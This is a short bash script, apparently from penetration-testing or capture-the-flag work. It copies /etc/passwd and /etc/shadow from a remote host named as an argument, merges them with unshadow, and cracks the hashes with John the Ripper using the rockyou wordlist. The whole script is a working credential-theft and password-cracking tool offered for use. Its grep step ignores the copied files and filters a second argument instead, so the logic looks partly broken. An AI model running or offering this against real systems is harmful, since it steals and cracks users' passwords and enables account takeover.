#! /bin/bash

scp $1:/etc/passwd passwd
scp $1:/etc/shadow shadow

grep passwd "$2" | tee passwd.only
grep shadow "$2" | tee shadow.only

unshadow passwd.only shadow.only > unshadowed
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed
